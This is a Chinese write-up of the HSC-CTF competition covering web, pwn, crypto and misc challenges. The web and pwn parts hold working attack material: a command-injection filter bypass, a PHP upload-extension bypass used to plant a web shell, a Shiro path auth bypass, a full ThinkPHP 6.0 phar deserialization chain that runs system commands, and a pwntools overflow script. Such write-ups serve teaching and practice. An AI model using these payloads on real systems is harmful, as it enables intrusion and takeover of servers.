---
title: HSC-CTF
categories: 赛题wp
---

# 前言

红客突击队ctf，web等环境好了补全

<!--more-->

# WEB

## CLICK

F12在js文件里base64解码发现flag

![image12](https://img-blog.csdnimg.cn/img_convert/683151d46ea198887ff17a5294d0e86b.png)

Flag：flag{23c4fe0c-7412-4109-91e5-775070ee2dee}



## Web-sign in

 访问robots.txt发现fiag_ls_h3re.php，发现f12被禁用，返回之前页面打开控制台，再访问

![image13](https://img-blog.csdnimg.cn/img_convert/df11901a82f1d595d1bb89d2751613de.png)



Flag：flag{e1c3d9a2-7888-4620-9559-01cb150fe23e}

## Exec

简简单单bypass，利用linux特性即可绕过，但是exec不回显内容，所以可以把结果写进去

![image14](https://img-blog.csdnimg.cn/img_convert/8ba2e534f0fe717af58300526e9ceab3.png)

Payload：?cmd=l''s${IFS}/${IFS}>1.txt

![image15](https://img-blog.csdnimg.cn/img_convert/de99224a49055ffae78963982ed3b4ca.png)

同理nl一下就行了

Flag：flag{46934a0f-5d8e-41bc-a130-3b8881dcde53}



## CMS SYSTEM

[www.zip](http://www.zip) 泄露，网上的nday修改管理员密码

![image16](https://img-blog.csdnimg.cn/img_convert/66110740140d1d4c6be27cdd123a0377.png)

利用nday上传一句话文件失败，审计源码，发现checkType检查的是数组的第二个，形成文件名时为数组减一，可以构造1.png.php绕过

![image17](https://img-blog.csdnimg.cn/img_convert/f9c62ad18d3f6964929cada0fd8f77c4.png)

上传logo

![image18](https://img-blog.csdnimg.cn/img_convert/7b33e6ed391a7b93bf36690c0cd5f584.png)

上传一句话

![image19](https://img-blog.csdnimg.cn/img_convert/c7c0066cd2214a643d26d907bc4c9339.png)



![image20](https://img-blog.csdnimg.cn/img_convert/7ee1c8a695c551d6b898f644311e3017.png)

Flag：flag{a5658c87-291f-4916-b27d-f6db707d5885}



## JAVA

附件是一个poc.xml 和 LoginController.java

pom.xml中发现cc依赖

![image-20220301191215690](https://img-blog.csdnimg.cn/img_convert/2a5f103697fd0f53407df60227bf43ab.png)



看一下admin页面的功能，发现name参数存在反序列化操作，那就是打CC了

![image-20220301191254974](https://img-blog.csdnimg.cn/img_convert/05197dce2bfd546fc41a5158087faf25.png)

再看看登录的逻辑，没什么利用点

![image-20220301191546663](https://img-blog.csdnimg.cn/img_convert/d31a254d97e12f767e58de3d1216dd13.png)

网站不是弱口令，最后尝试shiro权限绕过成功： **/admin/;/**  然后就是反序列化打CC依赖，题目环境打不开，没复现

## Avatar detection system

- phar反序列化
- TP6.0 反序列化链

正常上传

![image-20220302165329157](https://img-blog.csdnimg.cn/img_convert/e97bdf9ce21a50f0439dd512b44e7ce9.png)

无法上传php文件，尝试绕过失败，接着抓包发现发起了一个请求size的包，cookie这里利用了file协议

![image-20220302165431578](https://img-blog.csdnimg.cn/img_convert/955859379733299d91813733e4b854d6.png)

然后返回图片的大小

[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-vlzo8g1g-1648565300184)(C:/Users/cys/AppData/Roaming/Typora/typora-user-images/image-20220302165512740.png)]

发现站点为TP6.0.0

![image-20220302165546285](https://img-blog.csdnimg.cn/img_convert/75befc0f34a089586f375f51cf0cf849.png)

猜测后端使用了getimgsize，而这个函数可以触发phar序列化，那思路就是上传phar文件，然后将cookie这里的file修改为phar进行触发

```php
<?php
namespace think\model\concern;

trait Attribute{
    private $data=['y0ng'=>'cat /flag'];
    private $withAttr=['y0ng'=>'system'];
}
trait ModelEvent{
    protected $withEvent;
}

namespace think;

abstract class Model{
    use model\concern\Attribute;
    use model\concern\ModelEvent;
    private $exists;
    private $force;
    private $lazySave;
    protected $suffix;
    function __construct($obj = '')
    {
        $this->exists = true;
        $this->force = true;
        $this->lazySave = true;
        $this->withEvent = false;
        $this->suffix = $obj;
    }
}

namespace think\model;

use think\Model;

class Pivot extends Model{}

$a = new Pivot();
$b = new Pivot($a);

use Phar;
@unlink("y0ng.phar");
$phar = new Phar("y0ng.phar");
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$phar->setMetadata($b);
$phar->addFromString("test.txt", "test");
$phar->stopBuffering();
```

生成phar文件后，修改为png后缀，然后上传

![image-20220302165926524](https://img-blog.csdnimg.cn/img_convert/69ab0102dc80d8dba4ca3c1b721a6513.png)

phar触发

![image-20220302165956345](https://img-blog.csdnimg.cn/img_convert/46fc8ffddc21a3f2c756d3a74d983604.png)



![image-20220302192239918](https://img-blog.csdnimg.cn/img_convert/36bcaf886f005a344965188c2e53fcb0.png)

写shell后看看后端，file_get_contents触发了phar

```php
<?php
namespace app\controller;

use app\BaseController;
use think\exception\ValidateException;
use think\facade\Filesystem;

class Index extends BaseController
{
    public function index()
    {
        return view("myapp/index");
    }

    public function hello($name = 'ThinkPHP6')
    {
        return 'hello,' . $name;
    }

    public function upload(){
        $files = request()->file('photo');
        try {
            /*清空上传目录，以节省空间*/
            Filesystem::disk("public")->deleteDir("photo");
            /*处理上传逻辑*/
            $savename = Filesystem::disk('public')->putFile( 'photo', $files);
            $array = explode('.', basename($savename));
            $fil_extend_ename = end($array);
            if(in_array($fil_extend_ename, array("png", "jpg", "gif", "jpeg")) != true){
                Filesystem::disk("public")->deleteDir("photo");
                $err = array('status'=>0,'msg'=>'文件格式不合法');
                return json($err);
            }
            cookie('photopath', "file:///var/www/html/public/storage/".$savename);
            $res = array('url'=> '/storage/'.$savename,'realpath' => $savename, 'status' => 1, 'msg' => '上传成功');
            return json($res);
        } catch (ValidateException $e) {
            $err = array('status'=>0,'msg'=>$e->getMessage());
            return json($err);
        }
    }

    public function getsize(){
        try {
            $realpath = $_COOKIE['photopath'];
            $info = getimagesizefromstring(file_get_contents($realpath));
            /*清空上传目录，以节省空间*/
            $res = Filesystem::disk("public")->deleteDir("photo");
            $size = "Error when delete image dir.";
            if($res){
                $size = $info ? $info[0]."x".$info[1] : "Error when getimagesize.";
            }
            return json(array('result'=> $size, 'status' => 1, 'msg' => '上传成功'));
        } catch (ValidateException $e) {
            return json(array('status'=>0,'msg'=>$e->getMessage()));
        }
    }
}
```



## Language

目录结构

![image-20220302195015343](https://img-blog.csdnimg.cn/img_convert/8ac501c74427b4874f376b4ec35a53e2.png)

web为flask写的，接口是go写的

看一下go的路由，ctf/router.go

![image-20220302195114535](https://img-blog.csdnimg.cn/img_convert/43f1c57945f891ffa15d5c67f208e374.png)

ctf/flag对应Flag方法，backend.go，逻辑也很清晰 **action需要为readFlag token需要为secret** 但是secret是通过sql语句查询的，而且这个点不可控，就寻找可能存在sql注入的点，把secret注出来

![image-20220302195208083](https://img-blog.csdnimg.cn/img_convert/0bd0b67935af791ee6dd5c9d50b4efb7.png)

发现一处注入点

![image-20220302195426452](https://img-blog.csdnimg.cn/img_convert/2a154bc933ba31882f46aa1d2c87895b.png)

看看对应的app.py，**isalnum() 方法检测字符串是否由字母和数字组成**，这里就需要绕过了 因为 **name只能是字母和数字**，**votes必须是整型**

![image-20220302195748436](https://img-blog.csdnimg.cn/img_convert/0766f9e1eab46cb05a35e01988138577.png)

可以利用多参数进行绕过，python会解析第二个name，go会解析第一个name，我看还能 **[]** 绕过

![image-20220302201221490](https://img-blog.csdnimg.cn/img_convert/5f57fa983195036f4e47c6669dc45a74.png)



![image-20220302201241008](https://img-blog.csdnimg.cn/img_convert/6517c6ac8feab0a0d4744bd57fbc1fb3.png)

得到secret：re@l1y_4th_T0k3n，访问f/lag时还存在一个问题，action不能为readFlag

![image-20220302201504498](https://img-blog.csdnimg.cn/img_convert/c4e9c3bc8ca3bb55566cb5c52bf3a0f2.png)

绕过姿势：/flag%3faction=readFlag&token=

这样到python里，读不到action，转到go里读到action

![image-20220302211027826](https://img-blog.csdnimg.cn/img_convert/97c6da5b90978727e0228ca3a29a9c8a.png)

# **Pwn**

 Ez_pwn

签到pwn，Ida分析一下就能发现后门

```
from pwn import *
r = remote('hsc2019.site',10976)
payload=b'b'*0x48+p64(0x400741)
r.sendline(payload)
r.interactive()
```

flag: flag{ee977fb1-1701-4f6f-b4dd-13e1b91bce82}

# **CRYPTO**

## Easy SignIn

![image1](https://img-blog.csdnimg.cn/img_convert/0b3911fad4677208a7ea7f288b5a955e.png)

## RSA

搜索发现原题[(4条消息) NEWSCTF第一届--官方wp（2021新春赛）_ctf萌新1063624041-Xluo的博客-CSDN博客_ctf wp](https://blog.csdn.net/qq_55400494/article/details/117464317)，改一下参数跑一下就行了

```
n = 124689085077258164778068312042204623310499608479147230303784397390856552161216990480107601962337145795119702418941037207945225700624828698479201514402813520803268719496873756273737647275368178642547598433774089054609501123610487077356730853761096023439196090013976096800895454898815912067003882684415072791099101814292771752156182321690149765427100411447372302757213912836177392734921107826800451961356476403676537015635891993914259330805894806434804806828557650766890307484102711899388691574351557274537187289663586196658616258334182287445283333526057708831147791957688395960485045995002948607600604406559062549703501
t = 10

import gmpy2

for k in range(-1000000, 1000000):
    x = gmpy2.iroot(k ** 2 + 4 * t * n, 2)

    if x[1]:
        p = (-k + x[0]) // (2 * t)
        q = t * p + k
        break

import gmpy2
from Crypto.Util.number import long_to_bytes, bytes_to_long

phi = (p - 1) * (q - 1)
e = 57742
c = 57089349656454488535971268237112640808678921972499308620061475860564979797594115551952530069277022452969364212192304983697546604832633827546853055947447207342333989645243311993521374600648715233552522771885346402556591382705491510591127114201773297304492218255645659953740107015305266722841039559992219190665868501327315897172069355950699626976019934375536881746570219967192821765127789432830133383612341872295059056728626931869442945556678768428472037944494803103784312535269518166034046358978206653136483059224165128902173951760232760915861623138593103016278906012134142386906130217967052002870735327582045390117565

t = gmpy2.gcd(e, phi)
d = gmpy2.invert(e // t, phi)
m = pow(c, d, n)
msg = gmpy2.iroot(m, t)
if msg[1]:
    print(long_to_bytes(msg[0]))
```

## LINE-GENERATION-TEST

根据希尔密码原理 [CTF中编码与加解密总结 - gwind - 博客园 (cnblogs.com)](https://www.cnblogs.com/gwind/p/7997922.html)

![image2](https://img-blog.csdnimg.cn/img_convert/9cc087b076524c590c74517514df5383.png)

先求逆矩阵，再将两个矩阵相乘进行解密计算，然后对照表得到 RSCTF，md5一下得到flag

Flag：flag{e4163deba70420c58acb87abcab34141}



# Misc

## 汝闻,人言否

![image3](https://img-blog.csdnimg.cn/img_convert/dfb59dccf7b3bc509bcead72f632ee7c.png)

发现压缩包头部信息反了，提取压缩包，发现，压缩包加密，照片尾部找到键盘密码：WVALOU

![image4](https://img-blog.csdnimg.cn/img_convert/2cef9e1a51343c05b29bc69c3f4343ba.png)

解压后是个wav文件，音轨图为flag

![image5](https://img-blog.csdnimg.cn/img_convert/ed31fd9c4dbcc2f5629188a99b10570d.png)

Flag：flag{e5353bb7b57578bd4da1c898a8e2d767}



## DORAEMON

发现加密图片，提示6位数字，爆破



![$1YW$X2JVWQ_ASG0SU~TZZX](https://gitee.com/yongsheng220/image/raw/master/hsc-ctf/](YW$X2JVWQ_ASG0SU~TZZX.png)



爆破结果为 376852

![2](https://img-blog.csdnimg.cn/img_convert/8951361d4f4fb145ff36e122fccee603.png)

利用 tweakpng修改文件高度发现少了定位角得二维码，ppt补全

![3](https://img-blog.csdnimg.cn/img_convert/4be1f284fdc029b0ce8077622c5f83dd.png)

Flag：flag{sing1emak3r10v3m!sc}

## WIRESHARK

发现png图片，提取

![image6](https://img-blog.csdnimg.cn/img_convert/9d282528c2c7951386e9fddc2c380648.png)



![image7](https://img-blog.csdnimg.cn/img_convert/9b315e34955bcbe573df024fd2cc37aa.png)

Stegsolve发现另一张图片，提取为一张二维码

![image8](https://img-blog.csdnimg.cn/img_convert/4635183b36f2de24ffd6c85218739ce1.png)



![image9](https://img-blog.csdnimg.cn/img_convert/88d1a76f49a352268cafce35f8a527f5.png)

扫描得到：wrsak..iehr370，栅栏解密得到 wireshark3.7.0 解压压缩包，发现pdf格式结尾

![image10](https://img-blog.csdnimg.cn/img_convert/adf94aa5c9762e1ac0bf83ed81fd799e.png)

发现缺少pdf头部信息，补全pdf头后用 wbstego一把嗦得到flag

Flag：flag{Go0dJ0B_y0ufIndLt}



## PERFORMANCE-ART

![image11](https://img-blog.csdnimg.cn/img_convert/02e45c7269bf2d87db4542ee1456ef07.png)



发现图片里有银河字母，其他字母凹凸文字，照着图片手撸下来发现是个压缩包，解压得到base64 ，解一下得到flag

Falg：flag{g5A0!i2f1}




